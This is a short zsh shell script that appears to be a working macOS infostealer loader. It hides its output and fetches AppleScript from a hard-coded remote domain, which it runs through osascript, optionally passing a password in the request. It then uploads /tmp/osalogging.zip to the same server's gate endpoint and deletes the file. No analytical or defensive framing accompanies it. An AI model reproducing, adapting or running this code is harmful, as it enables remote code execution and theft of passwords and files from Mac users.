#!/bin/zsh
daemon_function() {
    exec </dev/null
    exec >/dev/null
    exec 2>/dev/null
    local domain="barbermoo.fun"
    local token="efd0d7bfa128e179c32b48de86663a48b06ee6878aad7ff0923e3ab1f59bb8c8"
    local api_key="5190ef1733183a0dc63fb623357f56d6"
    if [ $# -gt 0 ]; then
        curl -k -s --max-time 30 \
          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
          -H "api-key: $api_key" \
          "http://$domain/dynamic?txd=$token&pwd=$1" | osascript
    else
        curl -k -s --max-time 30 \
          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
          -H "api-key: $api_key" \
          "http://$domain/dynamic?txd=$token" | osascript
    fi
    if [ $? -ne 0 ]; then
        exit 1
    fi
    curl -k -X POST \
         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
         -H "api-key: $api_key" \
         -H "cl: 0" \
         --max-time 300 \
         -F "file=@/tmp/osalogging.zip" \
         -F "buildtxd=$token" \
         "http://$domain/gate"
    if [ $? -ne 0 ]; then
        exit 1
    fi
    rm -f /tmp/osalogging.zip
}
if daemon_function "$@" & then
    exit 0
else
    exit 1
fi
